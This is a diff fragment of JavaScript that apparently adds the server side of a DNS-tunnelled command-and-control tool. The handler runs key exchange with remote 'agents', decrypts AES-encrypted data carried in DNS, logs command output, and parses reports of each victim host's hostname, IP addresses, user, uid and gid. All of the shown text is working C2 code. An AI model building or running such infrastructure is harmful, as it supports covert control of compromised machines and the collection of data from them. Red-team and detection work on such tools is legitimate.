+                    this.log.error(`cannot import key for ${agentId}: ${emsg(ex)}`);
+                    return AgentStatus.ERROR_IMPORTING_KEY;
+                }
+                this.log.success(`agent(${agentId}) keyx: ${this.agents[agentId].keyx.asPublicECKey().toString("spki")}`);
+
+                try {
+                    this.agents[agentId].secret = this.crypto.derive_secret(this.agents[agentId].keyx, this.master_password);
+                } catch (ex) {
+                    this.log.error(`cannot derive secret for ${agentId}: ${emsg(ex)}`);
+                    return AgentStatus.ERROR_DERIVING_SECRET;
+                }
+                this.log.success(`agent(${agentId}) secret: ${this.agents[agentId].secret?.toString("hex")}`);
+
+                // if there are no more queued up keyx's, ignore further keyxs from agent
+                if (!this.is_command_in_sendq(agentId, AgentCommand.AGENT_KEYX)) this.agents[agentId].allow_keyx = false;
+                break;
+            case AgentCommand.AGENT_MSG:
+                try {
+                    plaintext = this.decrypt_dns_message(agentId, data);
+                } catch (ex) {
+                    this.log.error(`cannot decrypt message from ${agentId}: ${emsg(ex)}`);
+                    return AgentStatus.ERROR_DECRYPTING_MESSAGE;
+                }
+                this.log.success(`agent(${agentId}) output>\n ${plaintext}`);
+                break;
+            case AgentCommand.AGENT_SYSINFO:
+                plaintext = "";
+                try {
+                    plaintext = this.decrypt_dns_message(agentId, data);
+                } catch (ex) {
+                    this.log.error(`cannot decrypt message from ${agentId}: ${emsg(ex)}`);
+                    return AgentStatus.ERROR_DECRYPTING_MESSAGE;
+                }
+
+                const sysInfo = plaintext.split(";");
+                if (sysInfo.length < 3) {
+                    this.log.error(`invalid sysinfo from ${agentId}: ${plaintext}`);
+                    return AgentStatus.ERROR_INVALID_MESSAGE;
+                }
+
+                const userInfo = sysInfo[2].split(":");
+                if (userInfo.length < 3) {
+                    this.log.error(`invalid sysinfo:userinfo from ${agentId}: ${plaintext}`);
+                    return AgentStatus.ERROR_INVALID_MESSAGE;
+                }
+                const displayRows = [
+                    ["hostname", sysInfo[0]],
+                    ["ips", sysInfo[1]],
+                    ["user", userInfo[0]],
+                    ["uid", userInfo[1]],
+                    ["gid", userInfo[2]],
+                ];
+
+                this.log.success(`agent(${agentId}) sysinfo>`);
+                this.log.display_table([], displayRows);
+                break;
+        }
+        return AgentStatus.DATA_RECEIVED;
+    }
+
+    decrypt_dns_message(agentId, data) {
+        if (!agentId) throw new Error("invalid agent id");
+        if (!data) throw new Error("invalid data");
+        if (!this.agents[agentId].keyx) throw new Error("missing keyx");
+
+        const buffer = Buffer.from(data, "hex");
+        const iv = buffer.slice(0, this.crypto.BLOCK_LENGTH);
+        const ciphertext = buffer.slice(this.crypto.BLOCK_LENGTH);
+
+        // may throw errors
+        const plaintext = this.crypto.aes_decrypt(ciphertext, this.agents[agentId].secret, iv);
+        return plaintext.toString();
     }
 }
 
